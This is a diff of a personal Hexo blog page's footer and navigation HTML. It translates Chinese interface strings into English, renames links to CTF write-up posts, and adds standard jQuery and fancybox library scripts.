-      <strong>本文链接：</strong>
-      <a href="https://4xwi11.github.io/posts/7744a72a/" title="20211205 湖湘杯Pwn部分WP">https://4xwi11.github.io/posts/7744a72a/</a>
+      <strong>Post link: </strong>
+      <a href="https://4xwi11.github.io/posts/7744a72a/" title="20211205-湖湘杯-PwnSecPartWriteUp">https://4xwi11.github.io/posts/7744a72a/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
 
-          <div class="post-tags">
-              <a href="/tags/pivoting/" rel="tag"># pivoting</a>
-              <a href="/tags/AWDP/" rel="tag"># AWDP</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/8b226326/" rel="prev" title="20211206 GWBCrypto方向WP">
-                  <i class="fa fa-chevron-left"></i> 20211206 GWBCrypto方向WP
+                <a href="/posts/8b226326/" rel="prev" title="20211206-GWB-CryproSecWriteUp">
+                  <i class="fa fa-chevron-left"></i> 20211206-GWB-CryproSecWriteUp
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/b83e9e49/" rel="next" title="20211211 MT">
-                  20211211 MT <i class="fa fa-chevron-right"></i>
+                <a href="/posts/b83e9e49/" rel="next" title="20211211-美团CTF">
+                  20211211-美团CTF <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -475,8 +443,8 @@
           mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
           seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
           snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
-          document.getElementById("timeDate").innerHTML = "博主已经爬了 "+dnum+" 天 "; 
-          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+          document.getElementById("timeDate").innerHTML = " has been running for "+dnum+" Days "; 
+          document.getElementById("times").innerHTML = hnum + " H " + mnum + " Min " + snum + " S "; 
       } 
   setInterval("createtime()",250);
   </script>
@@ -486,13 +454,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="Symbols count total">873k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:51</span>
+    <span title="Reading time total">13:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -500,7 +468,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-user"></i>
       </span>
-      <span class="site-uv" title="总访客量">
+      <span class="site-uv" title="Total Visitors">
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
@@ -508,20 +476,26 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
       </span>
-      <span class="site-pv" title="总访问量">
+      <span class="site-pv" title="Total Views">
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
 </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
 
     </div>
   </footer>
 
   
   <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
 <script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+// 在最后添加<script src="/js/code-unfold.js"></script>
 
   
 <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
@@ -529,6 +503,7 @@
 
 
 
+  <script src="/js/third-party/fancybox.js"></script>
 
 
   
